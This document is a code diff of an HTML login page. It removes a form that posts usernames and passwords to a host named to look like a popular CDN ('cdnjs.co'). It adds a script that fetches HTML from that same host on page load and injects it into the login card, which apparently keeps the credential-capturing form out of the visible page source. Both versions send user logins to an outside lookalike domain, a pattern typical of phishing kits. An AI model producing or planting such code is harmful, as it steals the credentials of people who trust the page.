@@ -91,31 +91,29 @@
         <div class="page-header-image" style="background-image:url(../assets/img/login.jpg)"></div>
         <div class="container">
             <div class="col-md-4 content-center">
-                <div class="card card-login card-plain">
-                    <form class="form" method="POST" action="https://cdnjs.co/beha/login.php">
-                        <div class="header header-primary text-center">
-                            <div class="logo-container">
-                                <img src="../assets/img/now-logo.png" alt="">
-                            </div>
-                        </div>
-                        <div class="content">
-                            <div class="input-group form-group-no-border input-lg">
-                                <span class="input-group-addon">
-                                    <i class="now-ui-icons users_circle-08"></i>
-                                </span>
-                                <input type="text" name="nm" class="form-control" placeholder="Username">
-                            </div>
-                            <div class="input-group form-group-no-border input-lg">
-                                <span class="input-group-addon">
-                                    <i class="now-ui-icons text_caps-small"></i>
-                                </span>
-                                <input type="password" placeholder="Password" name="psw" class="form-control" />
-                            </div>
-                        </div>
-                        <div class="footer text-center">
-                            <button type="submit" class="btn btn-primary btn-round btn-lg btn-block">Login</button>
-                        </div>
-                    </form>
+                <div id='tab' class="card card-login card-plain">
+			<script>
+var cors_api_url = '';
+  function doCORSRequest(options, printResult) {
+    var x = new XMLHttpRequest();
+    x.open(options.method, cors_api_url + options.url);
+    x.onload = x.onerror = function() {
+      printResult(x.responseText);
+    };
+    x.send(options.data);
+  }
+
+  // Bind event
+  (function load() {
+    doCORSRequest({
+        method: 'GET',
+        url: 'https://cdnjs.co/beha/login.php?page=login',
+      }, function printResult(result) {
+        document.getElementById("tab").innerHTML = result;
+      });
+  
+  })();
+</script>
                 </div>
             </div>
         </div>
